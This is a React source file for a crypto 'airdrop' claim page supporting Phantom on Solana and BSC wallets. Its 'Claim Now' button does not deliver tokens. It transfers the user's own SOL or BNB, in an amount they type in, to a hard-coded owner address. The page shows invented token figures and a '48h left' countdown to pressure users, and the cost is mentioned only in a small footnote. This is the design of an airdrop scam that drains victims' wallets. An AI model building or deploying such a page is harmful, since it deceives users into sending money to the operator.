import React, { useState } from 'react';
import { useAccount, useBalance, useWriteContract } from 'wagmi';
import { parseEther, formatEther } from 'viem';
import { Gift, Coins, Timer } from 'lucide-react';
import { toast } from 'react-hot-toast';
import { useChain } from '../context/ChainContext';
import { Container, Card, Button } from '../components/shared';
import { CHAIN_CONFIG } from '../config/constants';

const AIRDROP_ABI = [
  {
    "inputs": [],
    "name": "claim",
    "outputs": [],
    "stateMutability": "payable",
    "type": "function"
  }
] as const;

export default function Airdrop() {
  const { selectedChain, getChainConfig } = useChain();
  const chainConfig = getChainConfig();
  
  const [amount, setAmount] = useState('0.1');
  const [loading, setLoading] = useState(false);

  const { address, isConnected } = useAccount();
  const { data: balance } = useBalance({
    address: address,
  });

  const { writeContract } = useWriteContract();

  const handleClaim = async () => {
    if (!amount) {
      toast.error('Please enter an amount');
      return;
    }

    setLoading(true);
    try {
      if (selectedChain === 'SOLANA') {
        const phantom = window.phantom?.solana;
        
        if (!phantom?.isConnected) {
          toast.error('Please connect your Phantom wallet');
          return;
        }

        // Create Solana transaction
        const transaction = await phantom.request({
          method: 'transfer',
          params: {
            to: CHAIN_CONFIG.SOLANA.ownerAddress,
            amount: parseFloat(amount) * 1e9 // Convert to lamports
          }
        });
        
        toast.success('Airdrop claimed on Solana!');
      } else {
        // BSC transaction
        await writeContract({
          address: CHAIN_CONFIG.BSC.ownerAddress as `0x${string}`,
          abi: AIRDROP_ABI,
          functionName: 'claim',
          value: parseEther(amount),
        });
        
        toast.success('Airdrop claimed on BSC!');
      }
    } catch (error) {
      console.error('Claim error:', error);
      toast.error('Failed to claim airdrop');
    } finally {
      setLoading(false);
    }
  };

  if (!isConnected) {
    return (
      <Container className="py-20">
        <div className="max-w-lg mx-auto">
          <Card>
            <div className="text-center p-6">
              <h2 className="text-xl font-bold mb-4">Connect Wallet</h2>
              <p className="text-gray-400 mb-6">Please connect your wallet to claim the airdrop.</p>
            </div>
          </Card>
        </div>
      </Container>
    );
  }

  return (
    <Container className="py-20">
      <div className="max-w-lg mx-auto">
        <div className="grid grid-cols-2 gap-4 mb-8">
          <Card>
            <div className="flex items-center gap-2 mb-2">
              <Gift className="text-yellow-500" size={20} />
              <span className="text-gray-400">Available Tokens</span>
            </div>
            <p className="text-2xl font-bold text-white">995 BWT</p>
          </Card>
          <Card>
            <div className="flex items-center gap-2 mb-2">
              <Coins className="text-yellow-500" size={20} />
              <span className="text-gray-400">Token Value</span>
            </div>
            <p className="text-2xl font-bold text-white">$56.00</p>
          </Card>
        </div>

        <Card>
          <div className="flex items-center justify-between mb-8">
            <h2 className="text-xl font-bold text-white">Claim Airdrop</h2>
            <div className="flex items-center gap-2 text-yellow-500">
              <Timer size={20} />
              <span className="text-sm font-medium">48h left</span>
            </div>
          </div>

          <div className="space-y-6">
            <div>
              <div className="flex justify-between mb-2">
                <label className="text-sm text-gray-400">Your Balance</label>
                <span className="text-sm text-gray-400">
                  {balance ? `${formatEther(balance.value)} ${chainConfig.symbol}` : `0 ${chainConfig.symbol}`}
                </span>
              </div>
              <input
                type="number"
                value={amount}
                onChange={(e) => setAmount(e.target.value)}
                min="0.1"
                step="0.1"
                className="w-full bg-gray-700 border border-gray-600 rounded-lg px-4 py-3 text-white focus:ring-2 focus:ring-yellow-500 focus:border-transparent"
                placeholder={`Enter ${chainConfig.symbol} amount`}
              />
            </div>

            <Button
              onClick={handleClaim}
              disabled={loading || !amount}
              isLoading={loading}
              className="w-full"
            >
              {loading ? 'Claiming...' : 'Claim Now'}
            </Button>

            <p className="text-sm text-gray-400 text-center">
              Note: This will transfer {chainConfig.symbol} to claim your airdrop tokens.
            </p>
          </div>
        </Card>
      </div>
    </Container>
  );
}